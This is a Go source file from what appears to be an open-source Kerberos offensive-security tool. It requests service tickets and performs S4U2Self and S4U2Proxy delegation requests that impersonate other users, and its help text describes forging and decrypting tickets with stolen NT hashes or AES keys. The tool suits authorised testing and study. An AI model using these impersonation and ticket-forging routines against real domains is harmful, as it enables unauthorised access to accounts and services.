// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/jfjallid/gofork/encoding/asn1"
	"github.com/jfjallid/gokrb5/v8/client"
	"github.com/jfjallid/gokrb5/v8/config"
	"github.com/jfjallid/gokrb5/v8/crypto"
	"github.com/jfjallid/gokrb5/v8/iana/chksumtype"
	"github.com/jfjallid/gokrb5/v8/iana/etypeID"
	"github.com/jfjallid/gokrb5/v8/iana/flags"
	"github.com/jfjallid/gokrb5/v8/iana/keyusage"
	"github.com/jfjallid/gokrb5/v8/iana/nametype"
	"github.com/jfjallid/gokrb5/v8/iana/patype"
	"github.com/jfjallid/gokrb5/v8/messages"
	"github.com/jfjallid/gokrb5/v8/types"
)

var helpAskSTOptions = `
    Usage: ` + os.Args[0] + ` --ask-st [options]
    ` + helpConnectionOptions + `
    options:
          --spn	<SPN>             SPN used to request or forge a service ticket of format "service/FQDN"
          --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
          --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
          --impersonate <user>    Impersonate target username through S4U. Requires delegation to be setup
          --dump-all              Write all tickets to the CCache file
          --ccache-file <path>    Filename to write requested ticket to (default creds.ccache)
          --inspect               Inspect content of requested, forged or parsed ticket. Requires --sign-nt or --sign-aes
          --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
          --alt-service <SPN>     Override sname/SPN in ticket. Works if both services share account password.
          --krb5-conf <file>      Read krb5.conf file and use as config
`

func handleAskST(args *userArgs) (err error) {
	if args.signKeyNT != nil && args.signKeyAES != nil && args.inspect {
		return fmt.Errorf("Choose ONE of --sign-nt and --sign-aes when inspecting tickets")
	}
	if args.signKeyNT == nil && args.signKeyAES == nil && args.inspect {
		return fmt.Errorf("Must provide a decryption key with either --sign-nt or --sign-aes when inspecting a ticket")
	}
	if args.signKeyNT != nil && (len(args.signKeyNT) != 16) {
		return fmt.Errorf("Invalid length of NT hash provided with --sign-nt argument")
	}
	if args.signKeyAES != nil {
		hashLen := len(args.signKeyAES)
		switch hashLen {
		case 16:
			args.signAes128Key = true
		case 32:
			args.signAes256Key = true
		default:
			return fmt.Errorf("Invalid length of hex for --sign-aes: %d\n", hashLen)
		}
	}
	if args.inspect {
		if args.signAes128Key || args.signAes256Key {
			args.signingKey = args.signKeyAES
			args.signAes = true
		} else {
			args.signingKey = args.signKeyNT
		}
	}

	if !isFlagSet("out-file") {
		if args.ccacheFile != "" && args.impersonate == "" {
			fmt.Println("Going to write ticket to exising ccache file")
			args.targetFile = args.ccacheFile
		} else if args.impersonate != "" {
			args.targetFile = fmt.Sprintf("%s@%s_%s@%s.ccache", args.impersonate, args.service, args.serviceFQDN, args.userDomainUpper)
		} else if args.altService != "" {
			parts := strings.Split(args.altService, "/")
			if len(parts) > 1 {
				args.targetFile = fmt.Sprintf("%s@%s_%s@%s.ccache", args.username, parts[0], parts[1], args.userDomainUpper)
			} else {
				args.targetFile = fmt.Sprintf("%s@%s_%s@%s.ccache", args.username, parts[0], args.serviceFQDN, args.userDomainUpper)
			}
		} else {
			args.targetFile = fmt.Sprintf("%s@%s_%s@%s.ccache", args.username, args.service, args.serviceFQDN, args.userDomainUpper)
		}
	}

	targetSPN, err := getServiceTicket(args.c, args.krbConf, args.username, args.userDomain, args.service, args.serviceDomain, args.serviceHost, args.dcDomain, args.signingKey, args.signAes, args.inspect, args.impersonate, args.spn)
	if err != nil {
		log.Errorln(err)
		return
	}
	if args.impersonate != "" {
		err = saveToCCACHE(args, nil, nil, targetSPN, args.dumpAllTickets)
	} else {
		err = saveToCCACHE(args, nil, nil, targetSPN, args.dumpAllTickets)
	}
	if err != nil {
		log.Errorln(err)
		return
	}
	return
}

func doS4U2Proxy(c *client.Client, conf *config.Config, username, userDomain string, impersonate string, tgt messages.Ticket, st messages.Ticket, sessionKey types.EncryptionKey, spn string) (err error) {
	auth, err := types.NewAuthenticator(strings.ToUpper(userDomain), types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, username))
	if err != nil {
		log.Errorln(err)
		return
	}
	apReq, err := messages.NewAPReq(tgt, sessionKey, auth)
	if err != nil {
		log.Errorln(err)
		return
	}
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		log.Errorln(err)
		return
	}

	tgsReq, err := messages.NewS4UTGSReq(types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, impersonate), types.NewPrincipalName(nametype.KRB_NT_SRV_INST, spn), tgt.Realm, conf)
	tgsReq.PAData = types.PADataSequence{
		types.PAData{
			PADataType:  patype.PA_TGS_REQ,
			PADataValue: apReqBytes,
		},
	}

	// Set PaDATA Pacoptions
	paPacOptBytes, err := types.GetPAPacOptionsAsnMarshalled([]int{3}) // resource-based-contrained-delegation
	if err != nil {
		log.Errorln(err)
		return
	}
	pa := types.PAData{
		PADataType:  patype.PA_PAC_OPTIONS,
		PADataValue: paPacOptBytes,
	}
	tgsReq.PAData = append(tgsReq.PAData, pa)

	// Set additional ticket to ST
	tgsReq.ReqBody.AdditionalTickets = append(tgsReq.ReqBody.AdditionalTickets, st)
	opts := types.NewKrbFlags()
	types.SetFlags(&opts, []int{flags.Canonicalize, flags.Forwardable, flags.Renewable, flags.CnameInAddlTkt})
	tgsReq.KDCReqFields.ReqBody.KDCOptions = opts

	_, _, err = c.TGSExchange(tgsReq, tgt.Realm, tgt, sessionKey, 0)
	if err != nil {
		log.Errorln(err)
		return
	}

	return
}

func doS4U2Self(c *client.Client, conf *config.Config, username, userDomain string, impersonate string, tgt messages.Ticket, sessionKey types.EncryptionKey) (st messages.Ticket, err error) {
	auth, err := types.NewAuthenticator(strings.ToUpper(userDomain), types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, username))
	if err != nil {
		log.Errorln(err)
		return
	}

	apReq, err := messages.NewAPReq(tgt, sessionKey, auth)
	if err != nil {
		log.Errorln(err)
		return
	}
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		log.Errorln(err)
		return
	}

	tgsReq, err := messages.NewS4UTGSReq(types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, impersonate), types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, username), tgt.Realm, conf)
	tgsReq.PAData = types.PADataSequence{
		types.PAData{
			PADataType:  patype.PA_TGS_REQ,
			PADataValue: apReqBytes,
		},
	}

	s4uByteArray := bytes.NewBuffer([]byte{})
	binary.Write(s4uByteArray, binary.LittleEndian, nametype.KRB_NT_PRINCIPAL)
	binary.Write(s4uByteArray, binary.LittleEndian, []byte(impersonate+userDomain+"Kerberos"))

	checksumEtype, _ := crypto.GetChksumEtype(chksumtype.KERB_CHECKSUM_HMAC_MD5)
	cksumHash, err := checksumEtype.GetChecksumHash(sessionKey.KeyValue, s4uByteArray.Bytes(), keyusage.KERB_NON_KERB_CKSUM_SALT)
	if err != nil {
		log.Errorln(err)
		return
	}

	impersonatedPrinc := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, impersonate)
	paForUser := types.PAForUser{
		UserName:  impersonatedPrinc,
		UserRealm: userDomain,
		Chksum: types.Checksum{
			CksumType: checksumEtype.GetHashID(),
			Checksum:  cksumHash,
		},
		AuthPackage: "Kerberos",
	}
	paForUserBuf, err := asn1.Marshal(paForUser)
	if err != nil {
		log.Errorf("error marshaling PAForUser: %v", err)
		return
	}
	// Making sure required flags are set
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Forwardable)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Renewable)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Canonicalize)
	// Seems like we must support RC4 cipher for S4U
	foundRC4 := false
	for _, item := range tgsReq.ReqBody.EType {
		if item == etypeID.RC4_HMAC {
			foundRC4 = true
			break
		}
	}
	if !foundRC4 {
		tgsReq.ReqBody.EType = append(tgsReq.ReqBody.EType, etypeID.RC4_HMAC)
	}

	pa := types.PAData{
		PADataType:  patype.PA_FOR_USER,
		PADataValue: paForUserBuf,
	}
	tgsReq.PAData = append(tgsReq.PAData, pa)
	_, tgsRep, err := c.TGSExchange(tgsReq, strings.ToUpper(userDomain), tgt, sessionKey, 0)
	if err != nil {
		log.Errorln(err)
		return
	}
	return tgsRep.Ticket, nil
}

func doS4U2SelfU2U(c *client.Client, conf *config.Config, username, userDomain string, impersonate string, tgt messages.Ticket, sessionKey types.EncryptionKey) (st messages.Ticket, err error) {
	auth, err := types.NewAuthenticator(strings.ToUpper(userDomain), types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, username))
	if err != nil {
		log.Errorln(err)
		return
	}

	apReq, err := messages.NewAPReq(tgt, sessionKey, auth)
	if err != nil {
		log.Errorln(err)
		return
	}
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		log.Errorln(err)
		return
	}

	tgsReq, err := messages.NewS4UTGSReq(types.PrincipalName{}, types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, username), tgt.Realm, conf)
	tgsReq.PAData = types.PADataSequence{
		types.PAData{
			PADataType:  patype.PA_TGS_REQ,
			PADataValue: apReqBytes,
		},
	}

	//TODO Figure out why RTime cannot be set
	tgsReq.ReqBody.RTime = time.Time{}

	s4uByteArray := bytes.NewBuffer([]byte{})
	binary.Write(s4uByteArray, binary.LittleEndian, nametype.KRB_NT_PRINCIPAL)
	binary.Write(s4uByteArray, binary.LittleEndian, []byte(impersonate+userDomain+"Kerberos"))

	checksumEtype, _ := crypto.GetChksumEtype(chksumtype.KERB_CHECKSUM_HMAC_MD5)
	cksumHash, err := checksumEtype.GetChecksumHash(sessionKey.KeyValue, s4uByteArray.Bytes(), keyusage.KERB_NON_KERB_CKSUM_SALT)
	if err != nil {
		log.Errorln(err)
		return
	}

	impersonatedPrinc := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, impersonate)
	paForUser := types.PAForUser{
		UserName:  impersonatedPrinc,
		UserRealm: userDomain,
		Chksum: types.Checksum{
			CksumType: checksumEtype.GetHashID(),
			Checksum:  cksumHash,
		},
		AuthPackage: "Kerberos",
	}
	paForUserBuf, err := asn1.Marshal(paForUser)
	if err != nil {
		log.Errorf("error marshaling PAForUser: %v", err)
		return
	}
	// Making sure required flags are set
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Forwardable)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Renewable)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Canonicalize)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.RenewableOK)
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.EncTktInSkey)
	types.UnsetFlag(&tgsReq.ReqBody.KDCOptions, flags.Proxiable)
	// Seems like we must support RC4 cipher for S4U
	tgsReq.ReqBody.EType = []int32{tgt.EncPart.EType, etypeID.RC4_HMAC}

	//tgsReq.ReqBody.RTime = time.Time{}
	pa := types.PAData{
		PADataType:  patype.PA_FOR_USER,
		PADataValue: paForUserBuf,
	}
	tgsReq.PAData = append(tgsReq.PAData, pa)

	tgsReq.ReqBody.AdditionalTickets = append(tgsReq.ReqBody.AdditionalTickets, tgt)

	_, tgsRep, err := c.TGSExchange(tgsReq, strings.ToUpper(userDomain), tgt, sessionKey, 0)
	if err != nil {
		log.Errorln(err)
		return
	}
	return tgsRep.Ticket, nil
}

func getServiceTicket(c *client.Client, conf *config.Config, username, userDomain, service, serviceDomain, serviceHost, dcDomain string, signingKey []byte, signAes, inspect bool, impersonate, spn string) (targetSPN string, err error) {
	if impersonate != "" {
		var tgt, st messages.Ticket
		var sessionKey types.EncryptionKey
		tgt, sessionKey, err = c.GetTGT(strings.ToUpper(userDomain))
		if err != nil {
			log.Errorln(err)
			return
		}
		st, err = doS4U2Self(c, conf, username, userDomain, impersonate, tgt, sessionKey)
		if err != nil {
			log.Errorln(err)
			return
		}
		err = doS4U2Proxy(c, conf, username, userDomain, impersonate, tgt, st, sessionKey, spn)
		if err != nil {
			log.Errorln(err)
			return
		}
		targetSPN = spn
	} else {
		targetSPN, err = requestServiceTicket(c, service, serviceDomain, serviceHost, dcDomain, signingKey, signAes, inspect)
	}
	return
}

func requestServiceTicket(c *client.Client, service, serviceDomain, serviceHost, dcDomain string, signingKey []byte, signAes, inspect bool) (targetSPN string, err error) {
	target := serviceDomain
	// Maybe we should store the calculated SPN to use in the filename for the CCache?
	if serviceDomain == "" {
		target = serviceHost // Netbios
	} else if serviceHost != "" {
		target = serviceHost + "." + serviceDomain
	}
	targetSPN = fmt.Sprintf("%s/%s", service, target)
	log.Infof("Trying to get a service ticket for target SPN: %s\n", targetSPN)
	tkt, _, err := c.GetServiceTicketExt(targetSPN, dcDomain)
	if err != nil {
		log.Errorln(err)
		return
	}
	if inspect {
		err = inspectTicket(&tkt, signingKey, signAes)
		if err != nil {
			log.Errorln(err)
			//return
		}
	}
	return
}
